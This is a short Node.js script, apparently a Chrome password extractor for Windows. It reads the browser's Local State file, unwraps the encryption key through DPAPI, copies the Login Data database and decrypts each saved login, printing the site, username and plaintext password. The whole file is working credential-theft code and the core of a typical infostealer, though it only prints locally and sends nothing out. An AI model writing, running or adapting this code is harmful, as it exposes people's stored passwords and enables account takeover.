const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const crypt = require('./build/Release/crypt');

const TMP_FILENAME = 'data.tmp';

const rootDir = path.join(process.env.LocalAppData, 'Google', 'Chrome', 'User Data');
const loginDataFilePath = path.join(rootDir, 'Default', 'Login Data');
const stateFilePath = path.join(rootDir, 'Local State');

fs.readFile(stateFilePath, 'utf-8', (err, data) => {
  if (err) throw err;

  const state = JSON.parse(data);
  const keyBuffer = Buffer.from(state.os_crypt.encrypted_key, 'base64');
  // trim "DPAPI" header
  const dpapiKey = Buffer.alloc(keyBuffer.length - 5);
  keyBuffer.copy(dpapiKey, 0, 5, keyBuffer.length);

  const key = crypt.CryptUnprotectData(dpapiKey.buffer);

  fs.copyFile(loginDataFilePath, TMP_FILENAME, (err) => {
    if (err) throw err;

    const db = new sqlite3.Database(TMP_FILENAME);
    db.all('SELECT * FROM logins', (err, rows) => {
      if (err) return;
      rows.forEach((row) => {
        const pageUrl = row.origin_url;
        const username = row.username_value;
        const passwordBuf = row.password_value;
        const prefix = passwordBuf.subarray(0, 3).toString('utf-8');
        if (prefix !== 'v10') return;
        const iv = passwordBuf.subarray(3, 15);
        const ctext = passwordBuf.subarray(15, passwordBuf.length - 16);
        if (!ctext.length) return;
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        const decrypted = decipher.update(ctext);
        console.log(pageUrl, username, decrypted.toString('utf-8'));
      });
      // end
      fs.unlink(TMP_FILENAME, () => {
        console.log('');
      });
    });
  });
});
